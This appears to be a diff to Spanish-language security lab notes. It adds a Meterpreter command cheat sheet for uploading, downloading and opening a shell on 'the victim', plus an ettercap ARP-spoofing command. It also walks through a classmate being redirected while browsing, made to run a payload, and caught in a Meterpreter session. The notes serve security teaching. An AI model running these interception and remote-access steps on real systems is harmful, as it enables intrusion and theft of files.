@@ -382,7 +382,6 @@ etterfilter input.ef -o out.ef   # compilar filtro antes de usarlo.
 
 
 
-
 3- NAST: Sirve para analizar y monitorizar redes locales.
 -m	Muestra los equipos del segmento (IP + MAC)	
 -i	Especifica la interfaz de red a usar	
@@ -391,7 +390,29 @@ etterfilter input.ef -o out.ef   # compilar filtro antes de usarlo.
 -S	Detecta sniffers en la red (equipos escuchando tráfico)	
 -g	Muestra información general de la red (gateway, máscara, etc.)	
 -a	Analiza ARP (tabla de direcciones IP ↔ MAC)
+
+
+
+
+4-METASPLOIT:
+#
+
+
+# Meterpreter
+sysinfo          # Información del sistema comprometido
+getuid           # Ver qué usuario eres
+ps               # Listar procesos en ejecución
+pwd              # Ver directorio actual
+ls               # Listar archivos
+cd /ruta         # Cambiar directorio
+cat archivo.txt  # Ver contenido de archivo
+search -f *.txt  # Buscar archivos por patrón
+upload /ruta/local/file.txt   # Subir archivo a la víctima
+download file.txt /ruta/local # Descargar archivo de la víctima
+shell            # Acceder a la terminal normal de la víctima
+
 ```
+
 
 
 <br>
@@ -931,7 +952,7 @@ En una terminal:
 
 7-Ejecutar Ettercap
 ```bash
-ettercap -T -i eth0 -M arp:remote /10.11.48.175/ // -F filtro.ef
+ettercap -T -i eth0 -M arp:remote /10.11.48.175/ /10.11.48.1/ -F filtro.ef
 ```
 
 En otra terminal:
@@ -945,6 +966,30 @@ set LHOST 192.168.1.10  # Tu IP
 set LPORT 4444
 exploit
 ```
+
+
+Si ahora la víctima ejecuta cualquier página con w3m le redirige a mi página.
+
+Tendrá que descargar el archivo que le pone ahí y ejecutarlo y mientras estamos con exploit en metasploit se nos abrirá meterpreter.
+
+!!Estamos dentro de la máquina del compañero!!
+
+Comando de metasploit:
+```bash
+sysinfo          # Información del sistema comprometido
+getuid           # Ver qué usuario eres
+ps               # Listar procesos en ejecución
+pwd              # Ver directorio actual
+ls               # Listar archivos
+cd /ruta         # Cambiar directorio
+cat archivo.txt  # Ver contenido de archivo
+search -f *.txt  # Buscar archivos por patrón
+upload /ruta/local/file.txt   # Subir archivo a la víctima
+download file.txt /ruta/local # Descargar archivo de la víctima
+shell            # Acceder a la terminal normal de la víctima
+```
+
+
 
 <br>
 <br>
@@ -1119,6 +1164,7 @@ Una vez que OSSEC funciona, hacer un flush de OSSEC y veremos todo en pantalla. 
 
 
 <br>
+
 
 
 
